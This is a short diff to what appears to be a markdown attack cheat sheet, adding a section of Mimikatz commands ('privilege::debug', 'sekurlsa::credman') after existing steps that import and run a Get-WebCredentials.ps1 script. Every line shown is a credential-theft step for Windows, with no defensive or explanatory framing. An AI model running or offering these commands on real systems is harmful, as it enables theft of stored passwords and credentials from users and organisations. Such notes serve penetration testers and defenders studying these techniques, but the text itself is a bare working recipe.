@@ -15,3 +15,11 @@
 #### 5) Import-Module c:\tools\Get-WebCredentials.ps1
 
 #### 6) Get-WebCredentials.ps1
+
+# MIMIKATZ
+
+#### 1) mimikatz
+
+#### 2) privilege::debug
+
+#### 3) sekurlsa::credman
